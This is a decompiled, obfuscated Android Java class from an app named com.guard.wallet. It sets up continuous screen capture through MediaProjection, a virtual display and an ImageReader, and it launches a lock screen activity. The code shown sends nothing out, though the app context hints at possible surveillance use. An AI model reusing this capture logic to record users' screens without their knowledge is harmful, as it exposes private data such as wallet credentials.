package x;

import a1.q;
import android.content.Intent;
import android.hardware.display.VirtualDisplay;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.Looper;
import android.view.Surface;
import com.guard.wallet.LockActivity;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.utils.e;
import com.guard.wallet.utils.g;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.locks.ReentrantLock;

public final class a {
   public static a h = new a();
   public ImageReader a;
   public MediaProjection b;
   public VirtualDisplay c;
   public final ReentrantLock d = new ReentrantLock();
   public final ReentrantLock e = new ReentrantLock();
   public final AtomicBoolean f = new AtomicBoolean(false);
   public final b g = new b();

   public static VirtualDisplay a(MediaProjection var0, Surface var1) {
      ScreenMetricsVO var2 = com.guard.wallet.utils.e.e();
      return var0.createVirtualDisplay("ScreenCapture", var2.getWidth(), var2.getHeight(), var2.getDensity(), 18, var1, new d(), d());
   }

   public static a b() {
      if (h == null) {
         h = new a();
      }

      return h;
   }

   public static Handler d() {
      if (Looper.myLooper() == null) {
         Looper.prepare();
      }

      Looper var0 = Looper.myLooper();
      return var0 != null ? new Handler(var0) : new Handler(Looper.getMainLooper());
   }

   public final boolean c() {
      boolean var1;
      if (this.b != null && this.c != null && this.a != null) {
         var1 = true;
      } else {
         var1 = false;
      }

      return var1;
   }

   public final void e() {
      MediaProjection var1 = this.b;
      if (var1 != null) {
         var1.stop();
         this.b = null;
      }

      VirtualDisplay var2 = this.c;
      if (var2 != null) {
         var2.release();
         this.c = null;
      }

      ImageReader var3 = this.a;
      if (var3 != null) {
         var3.close();
         this.a = null;
      }
   }

   public final void f() {
      AtomicBoolean var1 = this.f;
      if (!var1.get()) {
         var1.set(true);
         if (LockActivity.b() == null) {
            com.guard.wallet.utils.g.d1(MainApplication.getInstance().getPackageName(), LockActivity.class.getName());
         } else {
            LockActivity.b().d();
         }
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void g(Intent var1) {
      ReentrantLock var2 = this.d;
      if (var2.tryLock()) {
         if (this.c()) {
            var2.unlock();
            return;
         }

         this.e();

         label45: {
            label44: {
               Exception var10000;
               label53: {
                  try {
                     if (com.guard.wallet.utils.g.Z() == null) {
                        break label44;
                     }

                     var10 = (MediaProjectionManager)com.guard.wallet.utils.g.Z().getSystemService("media_projection");
                  } catch (Exception var5) {
                     var10000 = var5;
                     boolean var10001 = false;
                     break label53;
                  }

                  if (var10 == null) {
                     break label44;
                  }

                  try {
                     var6 = var10.getMediaProjection(-1, var1);
                  } catch (Exception var4) {
                     var10000 = var4;
                     boolean var12 = false;
                     break label53;
                  }

                  if (var6 == null) {
                     break label44;
                  }

                  try {
                     c var11 = new c();
                     var6.registerCallback(var11, d());
                     break label45;
                  } catch (Exception var3) {
                     var10000 = var3;
                     boolean var13 = false;
                  }
               }

               Exception var7 = var10000;
               q.s("x.a", var7);
            }

            var6 = null;
         }

         this.b = var6;
         if (var6 != null) {
            ScreenMetricsVO var8 = com.guard.wallet.utils.e.e();
            ImageReader var9 = ImageReader.newInstance(var8.getWidth(), var8.getHeight(), 1, 2);
            this.a = var9;
            var9.setOnImageAvailableListener(new b(), d());
            this.c = a(this.b, this.a.getSurface());
         }
      }
   }
}
